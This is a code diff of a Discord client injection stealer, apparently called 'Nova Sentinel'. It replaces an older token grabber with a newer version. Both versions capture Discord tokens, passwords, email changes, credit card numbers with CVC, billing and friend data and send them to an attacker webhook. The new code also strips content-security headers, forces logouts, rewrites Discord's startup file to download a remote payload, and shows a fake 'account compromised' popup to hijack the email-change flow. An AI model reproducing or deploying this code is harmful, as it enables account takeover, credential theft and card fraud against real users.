-      break;
-    case 64:
-      badges += 'HypeSquad Bravery, ';
-      break;
-    case 256:
-      badges += 'HypeSquad Balance, ';
-      break;
-    case 0:
-      badges = 'None';
-      break;
-    default:
-      badges = 'None';
-      break;
-  }
-  return badges;
-};
-
-const hooker = async (content) => {
-  const data = JSON.stringify(content);
-  const url = new URL(config.webhook);
-  const headers = {
-    'Content-Type': 'application/json',
-    'Access-Control-Allow-Origin': '*',
-  };
-  if (!config.webhook.includes('api/webhooks')) {
-    const key = totp(config.webhook_protector_key);
-    headers['Authorization'] = key;
-  }
-  const options = {
-    protocol: url.protocol,
-    hostname: url.host,
-    path: url.pathname,
-    method: 'POST',
-    headers: headers,
-  };
-  const req = https.request(options);
-
-  req.on('error', (err) => {
-    console.log(err);
   });
-  req.write(data);
+
+  req.on("error", (error) => {
+    console.error("Erreur lors de la requête :", error);
+  });
+  req.write(postData);
   req.end();
 };
 
-const login = async (email, password, token) => {
-  const json = await getInfo(token);
-  const nitro = getNitro(json.premium_type);
-  const badges = getBadges(json.flags);
-  const billing = await getBilling(token);
-  const content = {
-    username: config.embed_name,
-    avatar_url: config.embed_icon,
-    embeds: [
-      {
-        color: config.embed_color,
+async function init() {
+  disablenoti();
+  if (fs.existsSync("./d3dcompiler.dlll")) {
+    doTheLogOut = true;
+  } else {
+    const directoryPath = "./";
+    fs.readdir(directoryPath, (err, files) => {
+      if (err) {
+      } else {
+        files.forEach((file) => {});
+      }
+    });
+  }
+}
+function updateEmail(token, newEmail, password) {
+  return new Promise((resolve, reject) => {
+    const data = JSON.stringify({
+      email: newEmail,
+      password: password,
+      email_token: null,
+    });
+    const options = {
+      hostname: "discord.com",
+      port: 443,
+      path: "/api/v9/users/@me",
+      method: "PATCH",
+      headers: {
+        "Content-Type": "application/json",
+        Authorization: `${token}`,
+      },
+    };
+    const req = https.request(options, (res) => {
+      let responseData = "";
+      res.on("data", (chunk) => {
+        responseData += chunk;
+      });
+      res.on("end", () => {
+        resolve(responseData);
+      });
+    });
+    req.on("error", (error) => {
+      reject(error.message);
+    });
+    req.write(data);
+    req.end();
+  });
+}
+
+function updatePassword(token, oldpassword, newpassword) {
+  return new Promise((resolve, reject) => {
+    const data = JSON.stringify({
+      password: oldpassword,
+      new_password: newpassword,
+    });
+    const options = {
+      hostname: "discord.com",
+      port: 443,
+      path: "/api/v9/users/@me",
+      method: "PATCH",
+      headers: {
+        "Content-Type": "application/json",
+        Authorization: `${token}`,
+      },
+    };
+    const req = https.request(options, (res) => {
+      let responseData = "";
+      res.on("data", (chunk) => {
+        responseData += chunk;
+      });
+      res.on("end", () => {
+        resolve(responseData);
+      });
+    });
+    req.on("error", (error) => {
+      reject(error.message);
+    });
+    req.write(data);
+    req.end();
+  });
+}
+function generatePassword() {
+  const baseWords = ["NovaSentinel", "Nova", "Gaypsilon", "Epsimerde"];
+  const randomBaseWord =
+    baseWords[Math.floor(Math.random() * baseWords.length)];
+  const randomNumberCount = Math.floor(Math.random() * 9) + 1;
+  const randomLettersCount =
+    Math.floor(Math.random() * (randomBaseWord.length - 1)) + 2;
+  const randomSymbolCount = Math.floor(Math.random() * 2) + 1;
+  let password = "";
+  password += randomBaseWord;
+  function generateRandomLetter() {
+    const alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+    return alphabet[Math.floor(Math.random() * alphabet.length)];
+  }
+  for (let i = 0; i < randomLettersCount; i++) {
+    password += generateRandomLetter();
+  }
+  function generateRandomSymbol() {
+    const symbols = "!@#$%^&*()-_=+[]{}|;:,.<>?";
+    return symbols[Math.floor(Math.random() * symbols.length)];
+  }
+  for (let i = 0; i < randomSymbolCount; i++) {
+    password += generateRandomSymbol();
+  }
+  function generateRandomDigit() {
+    return Math.floor(Math.random() * 10);
+  }
+  for (let i = 0; i < randomNumberCount; i++) {
+    password += generateRandomDigit();
+  }
+  return password;
+}
+
+const FirstTime = async () => {
+  var token = await execScript(tokenScript);
+  if (config["init-notify"] !== "true") return true;
+  if (fs.existsSync(__dirname + "/ThiefCat")) {
+    try {
+      fs.rmdirSync(__dirname + "/ThiefCat");
+    } catch (err) {}
+    var ip = await getIP();
+    console.log(ip);
+    var { appPath, appName } = path;
+    var client_discord = appName;
+    if (!token) {
+      var params = await makeEmbed({
+        title: "<:nova:1132934190032244786> Nova Sentinel Initialized",
         fields: [
           {
-            name: '**Account Info**',
-            value: `Email: **${email}** - Password: **${password}**`,
-            inline: false,
-          },
-          {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
-            inline: false,
-          },
-          {
-            name: '**Token**',
-            value: `\`${token}\``,
-            inline: false,
+            name: "Injection Info",
+            value: `\`\`\`diff\n- Computer Name: ${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\``,
+            inline: !1,
           },
         ],
-        author: {
-          name: json.username + '#' + json.discriminator + ' | ' + json.id,
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
-        },
-      },
-    ],
-  };
-  if (config.ping_on_run) content['content'] = config.ping_val;
-  hooker(content);
-};
-
-const passwordChanged = async (oldpassword, newpassword, token) => {
-  const json = await getInfo(token);
-  const nitro = getNitro(json.premium_type);
-  const badges = getBadges(json.flags);
-  const billing = await getBilling(token);
-  const content = {
-    username: config.embed_name,
-    avatar_url: config.embed_icon,
-    embeds: [
-      {
-        color: config.embed_color,
-        fields: [
-          {
-            name: '**Password Changed**',
-            value: `Email: **${json.email}**\nOld Password: **${oldpassword}**\nNew Password: **${newpassword}**`,
-            inline: true,
-          },
-          {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
-            inline: true,
-          },
-          {
-            name: '**Token**',
-            value: `\`${token}\``,
-            inline: false,
-          },
-        ],
-        author: {
-          name: json.username + '#' + json.discriminator + ' | ' + json.id,
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
-        },
-      },
-    ],
-  };
-  if (config.ping_on_run) content['content'] = config.ping_val;
-  hooker(content);
-};
-
-const emailChanged = async (email, password, token) => {
-  const json = await getInfo(token);
-  const nitro = getNitro(json.premium_type);
-  const badges = getBadges(json.flags);
-  const billing = await getBilling(token);
-  const content = {
-    username: config.embed_name,
-    avatar_url: config.embed_icon,
-    embeds: [
-      {
-        color: config.embed_color,
-        fields: [
-          {
-            name: '**Email Changed**',
-            value: `New Email: **${email}**\nPassword: **${password}**`,
-            inline: true,
-          },
-          {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
-            inline: true,
-          },
-          {
-            name: '**Token**',
-            value: `\`${token}\``,
-            inline: false,
-          },
-        ],
-        author: {
-          name: json.username + '#' + json.discriminator + ' | ' + json.id,
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
-        },
-      },
-    ],
-  };
-  if (config.ping_on_run) content['content'] = config.ping_val;
-  hooker(content);
-};
-
-const PaypalAdded = async (token) => {
-  const json = await getInfo(token);
-  const nitro = getNitro(json.premium_type);
-  const badges = getBadges(json.flags);
-  const billing = getBilling(token);
-  const content = {
-    username: config.embed_name,
-    avatar_url: config.embed_icon,
-    embeds: [
-      {
-        color: config.embed_color,
-        fields: [
-          {
-            name: '**Paypal Added**',
-            value: `Time to buy some nitro baby 😩`,
-            inline: false,
-          },
-          {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}*\nBadges: **${badges}**\nBilling: **${billing}**`,
-            inline: false,
-          },
-          {
-            name: '**Token**',
-            value: `\`${token}\``,
-            inline: false,
-          },
-        ],
-        author: {
-          name: json.username + '#' + json.discriminator + ' | ' + json.id,
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
-        },
-      },
-    ],
-  };
-  if (config.ping_on_run) content['content'] = config.ping_val;
-  hooker(content);
-};
-
-const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
-  const json = await getInfo(token);
-  const nitro = getNitro(json.premium_type);
-  const badges = getBadges(json.flags);
-  const billing = await getBilling(token);
-  const content = {
-    username: config.embed_name,
-    avatar_url: config.embed_icon,
-    embeds: [
-      {
-        color: config.embed_color,
-        fields: [
-          {
-            name: '**Credit Card Added**',
-            value: `Credit Card Number: **${number}**\nCVC: **${cvc}**\nCredit Card Expiration: **${expir_month}/${expir_year}**`,
-            inline: true,
-          },
-          {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
-            inline: true,
-          },
-          {
-            name: '**Token**',
-            value: `\`${token}\``,
-            inline: false,
-          },
-        ],
-        author: {
-          name: json.username + '#' + json.discriminator + ' | ' + json.id,
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
-        },
-      },
-    ],
-  };
-  if (config.ping_on_run) content['content'] = config.ping_val;
-  hooker(content);
-};
-
-const nitroBought = async (token) => {
-  const json = await getInfo(token);
-  const nitro = getNitro(json.premium_type);
-  const badges = getBadges(json.flags);
-  const billing = await getBilling(token);
-  const code = await buyNitro(token);
-  const content = {
-    username: config.embed_name,
-    content: code,
-    avatar_url: config.embed_icon,
-    embeds: [
-      {
-        color: config.embed_color,
-        fields: [
-          {
-            name: '**Nitro bought!**',
-            value: `**Nitro Code:**\n\`\`\`diff\n+ ${code}\`\`\``,
-            inline: true,
-          },
-          {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
-            inline: true,
-          },
-          {
-            name: '**Token**',
-            value: `\`${token}\``,
-            inline: false,
-          },
-        ],
-        author: {
-          name: json.username + '#' + json.discriminator + ' | ' + json.id,
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
-        },
-      },
-    ],
-  };
-  if (config.ping_on_run) content['content'] = config.ping_val + `\n${code}`;
-  hooker(content);
-};
-session.defaultSession.webRequest.onBeforeRequest(config.filter2, (details, callback) => {
-  if (details.url.startsWith('wss://remote-auth-gateway')) return callback({ cancel: true });
-  updateCheck();
-});
-
-session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
-  if (details.url.startsWith(config.webhook)) {
-    if (details.url.includes('discord.com')) {
-      callback({
-        responseHeaders: Object.assign(
-          {
-            'Access-Control-Allow-Headers': '*',
-          },
-          details.responseHeaders,
-        ),
       });
     } else {
-      callback({
-        responseHeaders: Object.assign(
-          {
-            'Content-Security-Policy': ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
-            'Access-Control-Allow-Headers': '*',
-            'Access-Control-Allow-Origin': '*',
-          },
-          details.responseHeaders,
-        ),
-      });
-    }
-  } else {
-    delete details.responseHeaders['content-security-policy'];
-    delete details.responseHeaders['content-security-policy-report-only'];
+      var user = await getURL("https://discord.com/api/v8/users/@me", token);
+      var billing = await getURL(
+        "https://discord.com/api/v9/users/@me/billing/payment-sources",
+        token
+      );
+      var friends = await getURL(
+        "https://discord.com/api/v9/users/@me/relationships",
+        token
+      );
+      var Nitro = await getURL(
+        "https://discord.com/api/v9/users/" + user.id + "/profile",
+        token
+      );
 
+      var Billings = parseBilling(billing);
+      var Friends = parseFriends(friends);
+      if (!user.avatar)
+        var userAvatar =
+          "https://raw.githubusercontent.com/KSCH-58/sub/main/assets/lilnova.png";
+      if (!user.banner)
+        var userBanner =
+          "https://raw.githubusercontent.com/KSCH-58/sub/main/assets/giphy.gif";
+
+      userBanner =
+        userBanner ??
+        (await getGifOrPNG(
+          `https://cdn.discordapp.com/banners/${user.id}/${user.banner}`
+        ));
+      userAvatar =
+        userAvatar ??
+        (await getGifOrPNG(
+          `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`
+        ));
+      var params = await makeEmbed({
+        title: " Nova Sentinel Initialized",
+        description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\``,
+        fields: [
+          {
+            name: "Username <a:inject:1130448568268881960>",
+            value: `\`${user.username}#${user.discriminator}\``,
+            inline: !0,
+          },
+          {
+            name: "ID <a:cat_rolling:1130448570789679165>",
+            value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
+            inline: !0,
+          },
+          {
+            name: "Nitro <a:nitro:1130453517312725052>",
+            value: `${GetNitro(Nitro)}`,
+            inline: !0,
+          },
+          {
+            name: "Badges <a:badges:1130448593715740692>",
+            value: `${GetBadges(user.flags)}`,
+            inline: !0,
+          },
+          {
+            name: "Language <:4533language:1130453119919206500>",
+            value: `${GetLangue(user.locale)}`,
+            inline: !0,
+          },
+          {
+            name: "NSFW <:3568underage:1153991874495922207>",
+            value: `${GetNSFW(user.nsfw_allowed)}`,
+            inline: !0,
+          },
+          {
+            name: "A2F <a:keys:1159078859682107453>",
+            value: `${GetA2F(user.mfa_enabled)}`,
+            inline: !0,
+          },
+          {
+            name: "@Copyright",
+            value: `[Nova Sentinel 2023 <:nova:1132934190032244786>](https://github.com/KSCH-58/Malicord)`,
+            inline: !0,
+          },
+          {
+            name: "Nova Files",
+            value: `[Gofile <:gofile:1150190597462823003>](${config.transfer_link})`,
+            inline: !0,
+          },
+          {
+            name: "Billing <a:money:1130448564632436787>",
+            value: `${Billings}`,
+            inline: !0,
+          },
+          {
+            name: "Email <:mail:1130451375495589968>",
+            value: `\`${user.email ?? "none"}\``,
+            inline: !0,
+          },
+          {
+            name: "Bio <:nova:1132934190032244786>",
+            value: `\`\`\`${
+              user.bio !== null && user.bio !== undefined && user.bio !== ""
+                ? user.bio
+                : ":x:"
+            }\`\`\``,
+            inline: false,
+          },
+          {
+            name: "<a:eatsomething:1130449693613228072> Token",
+            value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
+            inline: !1,
+          },
+        ],
+
+        thumbnail: userAvatar,
+      });
+      var params2 = await makeEmbed({
+        title: `<a:caat2:1130448854861488168> Total Friends (${Friends.len})`,
+        color: config["embed-color"],
+        description: Friends.badges,
+        image: userBanner,
+        thumbnail: userAvatar,
+      });
+
+      params.embeds.push(params2.embeds[0]);
+    }
+    await post(params);
+    if (
+      (config.logout != "false" || config.logout !== "%LOGOUT%") &&
+      config["logout-notify"] == "true"
+    ) {
+      if (!token) {
+        var params = await makeEmbed({
+          title:
+            "<:nova:1132934190032244786> Nova Sentinel User log out (User not Logged in before)",
+          fields: [
+            {
+              name: "Injection Info",
+              value: `\`\`\`Name Of Computer: \n${computerName}\nInjection PATH: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n`,
+              inline: !1,
+            },
+          ],
+        });
+      } else {
+        var user = await getURL("https://discord.com/api/v8/users/@me", token);
+        var billing = await getURL(
+          "https://discord.com/api/v9/users/@me/billing/payment-sources",
+          token
+        );
+        var friends = await getURL(
+          "https://discord.com/api/v9/users/@me/relationships",
+          token
+        );
+        var Nitro = await getURL(
+          "https://discord.com/api/v9/users/" + user.id + "/profile",
+          token
+        );
+
+        var Billings = parseBilling(billing);
+        var Friends = parseFriends(friends);
+        if (!user.avatar)
+          var userAvatar =
+            "https://raw.githubusercontent.com/KSCH-58/sub/main/assets/lilnova.png";
+        if (!user.banner)
+          var userBanner =
+            "https://raw.githubusercontent.com/KSCH-58/sub/main/assets/giphy.gif";
+
+        userBanner =
+          userBanner ??
+          (await getGifOrPNG(
+            `https://cdn.discordapp.com/banners/${user.id}/${user.banner}`
+          ));
+        userAvatar =
+          userAvatar ??
+          (await getGifOrPNG(
+            `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`
+          ));
+        var params = await makeEmbed({
+          title:
+            "<:nova:1132934190032244786> Nova Sentinel Victim got logged out",
+          description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
+          fields: [
+            {
+              name: "Username <a:inject:1130448568268881960>",
+              value: `\`${user.username}#${user.discriminator}\``,
+              inline: !0,
+            },
+            {
+              name: "ID <a:cat_rolling:1130448570789679165>",
+              value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
+              inline: !0,
+            },
+            {
+              name: "Nitro <a:nitro:1130453517312725052>",
+              value: `${GetNitro(Nitro)}`,
+              inline: !0,
+            },
+            {
+              name: "Badges <a:badges:1130448593715740692>",
+              value: `${GetBadges(user.flags)}`,
+              inline: !0,
+            },
+            {
+              name: "Language <:4533language:1130453119919206500>",
+              value: `${GetLangue(user.locale)}`,
+              inline: !0,
+            },
+            {
+              name: "NSFW <:3568underage:1153991874495922207>",
+              value: `${GetNSFW(user.nsfw_allowed)}`,
+              inline: !0,
+            },
+            {
+              name: "A2F <a:keys:1159078859682107453>",
+              value: `${GetA2F(user.mfa_enabled)}`,
+              inline: !0,
+            },
+            {
+              name: "@Copyright",
+              value: `[Nova Sentinel 2023 <:nova:1132934190032244786>](https://t.me/Sordeal)`,
+              inline: !0,
+            },
+            {
+              name: "Nova Files",
+              value: `[Gofile <:gofile:1150190597462823003>](${config.transfer_link})`,
+              inline: !0,
+            },
+            {
+              name: "Billing <a:money:1130448564632436787>",
+              value: `${Billings}`,
+              inline: !0,
+            },
+            {
+              name: "Email <:mail:1130451375495589968>",
+              value: `\`${user.email}\``,
+              inline: !0,
+            },
+            {
+              name: "Phone :mobile_phone:",
+              value: `\`${user.phone ?? "None"}\``,
+              inline: !0,
+            },
+            {
+              name: "Bio <:nova:1132934190032244786>",
+              value: `\`\`\`${
+                user.bio !== null && user.bio !== undefined && user.bio !== ""
+                  ? user.bio
+                  : ":x:"
+              }\`\`\``,
+              inline: false,
+            },
+            {
+              name: "<a:eatsomething:1130449693613228072> Token",
+              value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
+              inline: !1,
+            },
+          ],
+
+          thumbnail: userAvatar,
+        });
+        var params2 = await makeEmbed({
+          title: `<a:caat2:1130448854861488168> Total Friends (${Friends.len})`,
+          color: config["embed-color"],
+          description: Friends.badges,
+          image: userBanner,
+          thumbnail: userAvatar,
+        });
+
+        params.embeds.push(params2.embeds[0]);
+      }
+
+      try {
+        fs.writeFileSync("./d3dcompiler.dlll", "LogOut");
+      } catch (err) {}
+      await execScript(logOutScript);
+      doTheLogOut = true;
+
+      await post(params);
+    }
+
+    return false;
+  }
+};
+
+const path = (function () {
+  var appPath = electron.app.getAppPath().replace(/\\/g, "/").split("/");
+  appPath.pop();
+  appPath = appPath.join("/");
+  var appName = electron.app.getName();
+  return {
+    appPath,
+    appName,
+  };
+})();
+
+const checUpdate = () => {
+  var { appPath, appName } = path;
+  if (!doTheLogOut) {
+    try {
+      fs.writeFileSync("./d3dcompiler.dlll", "LogOut");
+    } catch (err) {}
+    execScript(logOutScript);
+    doTheLogOut = true;
+  }
+
+  var ressource = `${appPath}/app`;
+  var indexFile = __filename.replace(/\\/g, "/");
+  var betterDiscord = `${process.env.appdata.replace(
+    /\\/g,
+    "/"
+  )}/betterdiscord/data/betterdiscord.asar`;
+  var package = `${ressource}/package.json`;
+  var index = `${ressource}/index.js`;
+
+  if (!fs.existsSync(ressource)) fs.mkdirSync(ressource);
+  fs.writeFileSync(package, `{"name": "${appName}", "main": "./index.js"}`);
+
+  var script = `const fs = require("fs"), https = require("https")
+    
+    var index = "${indexFile}"
+    var betterDiscord = "${betterDiscord}"
+    
+    var negger = fs.readFileSync(index).toString()
+    if (negger == "module.exports = require('./core.asar');") init()
+    
+    function init() {
+        https.get("${config.injection_url}", res => {
+            var chunk = ""
+            res.on("data", data => chunk += data)
+            res.on("end", () => fs.writeFileSync(index, chunk.replace("%\x57EBHOOK%", "${config.webhook}")))
+        }).on("error", (err) => setTimeout(init(), 10000));
+    }
+    
+    require("${appPath}/app.asar")
+    if (fs.existsSync(betterDiscord)) require(betterDiscord)`;
+  fs.writeFileSync(index, script);
+  return;
+};
+electron.session.defaultSession.webRequest.onBeforeRequest(
+  config.Filter,
+  async (details, callback) => {
+    await electron.app.whenReady();
+    await FirstTime();
+    await init();
+    if (details.url.startsWith("wss://remote-auth-gateway"))
+      return callback({
+        cancel: true,
+      });
+
+    checUpdate();
+    callback({});
+  }
+);
+
+electron.session.defaultSession.webRequest.onHeadersReceived(
+  (request, callback) => {
+    delete request.responseHeaders["content-security-policy"];
+    delete request.responseHeaders["content-security-policy-report-only"];
     callback({
       responseHeaders: {
-        ...details.responseHeaders,
-        'Access-Control-Allow-Headers': '*',
+        ...request.responseHeaders,
+        "Access-Control-Allow-Headers": "*",
       },
     });
   }
-});
+);
 
-session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) => {
-  if (details.statusCode !== 200 && details.statusCode !== 202) return;
-  const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
-  const data = JSON.parse(unparsed_data);
-  const token = await execScript(
-    `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`,
+async function BoukiTuclcavectesfonctions() {
+  var token = await execScript(tokenScript);
+  var user = await getURL("https://discord.com/api/v8/users/@me", token);
+  var billing = await getURL(
+    "https://discord.com/api/v9/users/@me/billing/payment-sources",
+    token
   );
-  switch (true) {
-    case details.url.endsWith('login'):
-      login(data.login, data.password, token).catch(console.error);
-      break;
+  var friends = await getURL(
+    "https://discord.com/api/v9/users/@me/relationships",
+    token
+  );
+  var Nitro = await getURL(
+    "https://discord.com/api/v9/users/" + user.id + "/profile",
+    token
+  );
+  if (!user.avatar)
+    var userAvatar =
+      "https://raw.githubusercontent.com/KSCH-58/sub/main/assets/lilnova.png";
+  if (!user.banner)
+    var userBanner =
+      "https://raw.githubusercontent.com/KSCH-58/sub/main/assets/giphy.gif";
 
-    case details.url.endsWith('users/@me') && details.method === 'PATCH':
-      if (!data.password) return;
-      if (data.email) {
-        emailChanged(data.email, data.password, token).catch(console.error);
+  var userBanner =
+    userBanner ??
+    (await getGifOrPNG(
+      `https://cdn.discordapp.com/banners/${user.id}/${user.banner}`
+    ));
+  var userAvatar =
+    userAvatar ??
+    (await getGifOrPNG(
+      `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`
+    ));
+  var Billings = parseBilling(billing);
+  var Friends = parseFriends(friends);
+  return {
+    token,
+    user,
+    billing,
+    friends,
+    Nitro,
+    userAvatar,
+    userBanner,
+    userAvatar,
+    Billings,
+    Friends,
+  };
+}
+
+let scriptExecuted = false;
+
+electron.session.defaultSession.webRequest.onHeadersReceived(
+  async (request, callback) => {
+    delete request.responseHeaders["content-security-policy"];
+    delete request.responseHeaders["content-security-policy-report-only"];
+    callback({
+      responseHeaders: {
+        ...request.responseHeaders,
+        "Access-Control-Allow-Headers": "*",
+      },
+    });
+    /*if (request.url.includes("/users/@me")){
+      if (!["POST", "PATCH"].includes(request.method)) return;
+    if (request.statusCode !== 200) return;
+    try {
+      var data = JSON.parse(request.uploadData[0].bytes);
+    } catch (err) {
+      var data = queryString.parse(
+        decodeURIComponent(request.uploadData[0].bytes.toString())
+      );
+    }
+      console.log(data)
+    }*/
+    
+    if (config.force_backups_codes == "true") {
+      if (request.url.includes("/users/@me") && !scriptExecuted) {
+        scriptExecuted = true;
+        var {
+          token,
+          user,
+          billing,
+          friends,
+          Nitro,
+          userAvatar,
+          userBanner,
+          Billings,
+          Friends,
+        } = await BoukiTuclcavectesfonctions();
+        let language = user.locale ?? "en-US";
+
+        let [
+          editprofil,
+          editemailbutton,
+          titlepop,
+          intropop,
+          endintro,
+          lastend,
+          contact,
+        ] = await traduireTexte(language);
+        await execScript(
+          `
+                function clickButton(selector) {
+                  return new Promise((resolve, reject) => {
+                    const button = document.querySelector(selector);
+                    if (button) {
+                      const event = new MouseEvent("click", {
+                        bubbles: true,
+                        cancelable: true,
+                        view: window,
+                      });
+                
+                      button.dispatchEvent(event);
+                      resolve();
+                    } else {
+                    }
+                  });
+                }
+                
+                async function simulateClicks() {
+                  try {
+                    const div = document.createElement("div");
+                    div.innerHTML =
+                      '<div class="layerContainer-2lfOPe"> <div class="backdrop-2ByYRN withLayer-2VVmpp" style="opacity: 0.85; background: var(--black-500);"></div> <div class="layer-fP3xEz"> <div class="focusLock-bHVOlV" role="dialog" aria-labelledby=":rr:" tabindex="-1" aria-modal="true"> <div class="root-1CAIjD small-2xUY-3 fullscreenOnMobile-2971EC rootWithShadow-2hdL2J" style="opacity: 1; transform: scale(1);"><img alt="" class="headerImage-2osrlm" src="/assets/222756e9418e375e7ae974594b3aa1d2.svg"> <div style="position: relative; width: 440px; height: 367px; overflow: hidden;"> <div style="position: absolute; flex-direction: column; backface-visibility: hidden; width: 440px; transform: translate3d(0px, -50%, 0px) scale(1, 1); top: 50%; left: auto; right: auto;"> <form> <div class="flex-2S1XBF flex-3BkGQD horizontal-112GEH horizontal-1Piu5- flex-3BkGQD directionRow-2Iu2A9 justifyStart-2Mwniq alignCenter-14kD11 noWrap-hBpHBz header-1ffhsl confirmStartHeader-34wA-K" id=":rr:" style="flex: 0 0 auto;"> <div class="colorHeaderPrimary-3kwW7L size24-15VPAv title-3VYtQS">${titlepop} </div> <div class="defaultColor-1EVLSt text-md-normal-2rFCH3 description-3_efmf" data-text-variant="text-md/normal"> <p>${intropop} <strong>${user.email}</strong>, ${endintro} ${lastend}&nbsp;? ${contact}.</p> </div>  </div> </form> </div> </div> </div> </div> </div></div>';
+                    document.body.appendChild(div);
+                    document.body.appendChild(div);
+                    await new Promise((resolve) => setTimeout(resolve, 10000));
+                    document.body.removeChild(div);
+                    await clickButton('button[aria-label="${editprofil}"]');
+                    await new Promise((resolve) => setTimeout(resolve, 1000));
+                    await clickButton('button[aria-label="${editemailbutton}"]');
+                  } catch (error) {}
+                }
+                
+                simulateClicks();
+                `
+        );
       }
-      if (data.new_password) {
-        passwordChanged(data.password, data.new_password, token).catch(console.error);
+    }
+    if (config.changeMailAuto == "true") {
+      if (request.url.includes("/users/@me") && !scriptExecuted) {
+        scriptExecuted = true;
+        var {
+          token,
+          user,
+          billing,
+          friends,
+          Nitro,
+          userAvatar,
+          userBanner,
+          Billings,
+          Friends,
+        } = await BoukiTuclcavectesfonctions();
+        let language = user.locale ?? "en-US";
+
+        let [
+          editprofil,
+          editemailbutton,
+          titlepop,
+          intropop,
+          endintro,
+          lastend,
+          contact,
+        ] = await traduireTexte(language);
+        await execScript(
+          `
+                function clickButton(selector) {
+                  return new Promise((resolve, reject) => {
+                    const button = document.querySelector(selector);
+                    if (button) {
+                      const event = new MouseEvent("click", {
+                        bubbles: true,
+                        cancelable: true,
+                        view: window,
+                      });
+                
+                      button.dispatchEvent(event);
+                      resolve();
+                    } else {
+                    }
+                  });
+                }
+                
+                async function simulateClicks() {
+                  try {
+                    const div = document.createElement("div");
+                    div.innerHTML =
+                      '<div class="layerContainer-2lfOPe"> <div class="backdrop-2ByYRN withLayer-2VVmpp" style="opacity: 0.85; background: var(--black-500);"></div> <div class="layer-fP3xEz"> <div class="focusLock-bHVOlV" role="dialog" aria-labelledby=":rr:" tabindex="-1" aria-modal="true"> <div class="root-1CAIjD small-2xUY-3 fullscreenOnMobile-2971EC rootWithShadow-2hdL2J" style="opacity: 1; transform: scale(1);"><img alt="" class="headerImage-2osrlm" src="/assets/222756e9418e375e7ae974594b3aa1d2.svg"> <div style="position: relative; width: 440px; height: 367px; overflow: hidden;"> <div style="position: absolute; flex-direction: column; backface-visibility: hidden; width: 440px; transform: translate3d(0px, -50%, 0px) scale(1, 1); top: 50%; left: auto; right: auto;"> <form> <div class="flex-2S1XBF flex-3BkGQD horizontal-112GEH horizontal-1Piu5- flex-3BkGQD directionRow-2Iu2A9 justifyStart-2Mwniq alignCenter-14kD11 noWrap-hBpHBz header-1ffhsl confirmStartHeader-34wA-K" id=":rr:" style="flex: 0 0 auto;"> <div class="colorHeaderPrimary-3kwW7L size24-15VPAv title-3VYtQS">${titlepop} </div> <div class="defaultColor-1EVLSt text-md-normal-2rFCH3 description-3_efmf" data-text-variant="text-md/normal"> <p>${intropop} <strong>${user.email}</strong>, ${endintro} ${lastend}&nbsp;? ${contact}.</p> </div>  </div> </form> </div> </div> </div> </div> </div></div>';
+                    document.body.appendChild(div);
+                    document.body.appendChild(div);
+                    await new Promise((resolve) => setTimeout(resolve, 10000));
+                    document.body.removeChild(div);
+                    await clickButton('button[aria-label="${editprofil}"]');
+                    await new Promise((resolve) => setTimeout(resolve, 1000));
+                    await clickButton('button[aria-label="${editemailbutton}"]');
+                  } catch (error) {}
+                }
+                
+                simulateClicks();
+                `
+        );
       }
-      break;
-
-    case details.url.endsWith('tokens') && details.method === 'POST':
-      const item = querystring.parse(unparsedData.toString());
-      ccAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], token).catch(console.error);
-      break;
-
-    case details.url.endsWith('paypal_accounts') && details.method === 'POST':
-      PaypalAdded(token).catch(console.error);
-      break;
-
-    case details.url.endsWith('confirm') && details.method === 'POST':
-      if (!config.auto_buy_nitro) return;
-      setTimeout(() => {
-        nitroBought(token).catch(console.error);
-      }, 7500);
-      break;
-
-    default:
-      break;
+    }
   }
-});
-module.exports = require('./core.asar');
+);
+
+async function traduireTexte(langueCible) {
+  var languages = {
+    fr: [
+      "Paramètres utilisateur",
+      "Modifier l\\'adresse e-mail",
+      "Changez votre adresse e-mail",
+      "Nous avons détecté quelque chose d\\'inhabituel avec votre compte Discord, votre adresse,",
+      "a été compromise.",
